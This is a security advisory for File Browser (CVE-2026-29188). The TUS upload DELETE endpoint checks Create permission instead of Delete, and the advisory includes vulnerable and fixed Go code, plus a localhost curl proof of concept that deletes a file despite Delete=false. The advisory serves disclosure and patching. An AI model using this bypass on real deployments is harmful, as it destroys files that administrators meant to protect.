# File Browser's TUS Delete Endpoint Bypasses Delete Permission Check

**GHSA**: GHSA-79pf-vx4x-7jmm | **CVE**: CVE-2026-29188 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-284, CWE-732

**Affected Packages**:
- **github.com/filebrowser/filebrowser/v2** (go): <= 2.61.0

## Description

### Summary

A broken access control vulnerability in the TUS protocol DELETE endpoint allows authenticated users with only Create permission to delete arbitrary files and directories within their scope, bypassing the intended Delete permission restriction. Any multi-user deployment where administrators explicitly restrict file deletion for certain users is affected.

### Details

The tusDeleteHandler function in http/tus_handlers.go incorrectly gates the DELETE operation behind Perm.Create instead of Perm.Delete:

```go
// http/tus_handlers.go - tusDeleteHandler (VULNERABLE)
func tusDeleteHandler(cache UploadCache) handleFunc {
    return withUser(func(_ http.ResponseWriter, r *http.Request, d *data) (int, error) {
        if r.URL.Path == "/" || !d.user.Perm.Create {  // ← Wrong permission checked
            return http.StatusForbidden, nil
        }
        // ...
        err = d.user.Fs.RemoveAll(r.URL.Path)  // File is deleted
```

The correct resourceDeleteHandler in http/resource.go properly checks Perm.Delete:

```go
// http/resource.go - resourceDeleteHandler (CORRECT)
func resourceDeleteHandler(fileCache FileCache) handleFunc {
    return withUser(func(_ http.ResponseWriter, r *http.Request, d *data) (int, error) {
        if r.URL.Path == "/" || !d.user.Perm.Delete {  // ← Correct permission
            return http.StatusForbidden, nil
        }
```

This inconsistency means that DELETE /api/tus/{path} and DELETE /api/resources/{path} enforce entirely different permission models for the same underlying filesystem operation. The TUS endpoint was introduced to support resumable uploads (http/tus_handlers.go) and its DELETE handler is intended to cancel in-progress uploads -however, the RemoveAll call permanently removes the file from the filesystem regardless of how the upload was initiated.

### Proposed fix:

```go
// http/tus_handlers.go
- if r.URL.Path == "/" || !d.user.Perm.Create {
+ if r.URL.Path == "/" || !d.user.Perm.Delete {
```

### PoC

- filebrowser built from latest master (git clone https://github.com/filebrowser/filebrowser) 
- Tested on: Kali Linux, go version go1.23+

### Setup section

```bash
# Build and initialize
git clone https://github.com/filebrowser/filebrowser
cd filebrowser
go build -o filebrowser .
./filebrowser config init

# Create a test user with Create=true but Delete=false
./filebrowser users add testuser SuperSecurePassword1234 \
  --perm.create=true \
  --perm.delete=false

# Start server
./filebrowser &
```

### POC script steps

1. Confirm the Delete permission is correctly enforced on the standard endpoint:

```bash
TOKEN=$(curl -s -X POST localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"SuperSecurePassword1234"}')

# Attempt deletion via the standard resource endpoint → should be blocked
curl -s -X DELETE "localhost:8080/api/resources/target.txt" \
  -H "X-Auth: $TOKEN" \
  -w "HTTP Status: %{http_code}\n"

# Expected: HTTP Status: 403
```

2. Bypass via the TUS Delete endpoint:

```bash
# Initiate a TUS upload to register the file in the upload cache
curl -s -X POST "localhost:8080/api/tus/target.txt" \
  -H "X-Auth: $TOKEN" \
  -H "Upload-Length: 18" \
  -w "HTTP Status: %{http_code}\n"

# Expected: HTTP Status: 201

# Now delete via the TUS endpoint - Perm.Delete is NOT checked
curl -s -X DELETE "localhost:8080/api/tus/target.txt" \
  -H "X-Auth: $TOKEN" \
  -w "HTTP Status: %{http_code}\n"

# Expected: HTTP Status: 204  ← File deleted despite Perm.Delete=false
```

**Observed results:**
```
DELETE /api/resources/target.txt  -->  403 Forbidden      ( permission enforced )
DELETE /api/tus/target.txt            -->   204 No Content    ( permission bypassed )
```

### Impact
This is a broken access control vulnerability (IDOR / permission model bypass). It affects any filebrowser deployment where:

- Multiple users share a single instance, and
- An administrator has explicitly set Perm.Delete=false for one or more users to restrict destructive operations

An attacker (authenticated user with Perm.Create=true) can permanently delete any file or directory within their assigned scope-including files they did not create - by initiating a TUS upload against the target path and immediately issuing a TUS DELETE request. This completely undermines the intended access control model, as administrators have no reliable way to prevent file deletion for users who retain upload rights.
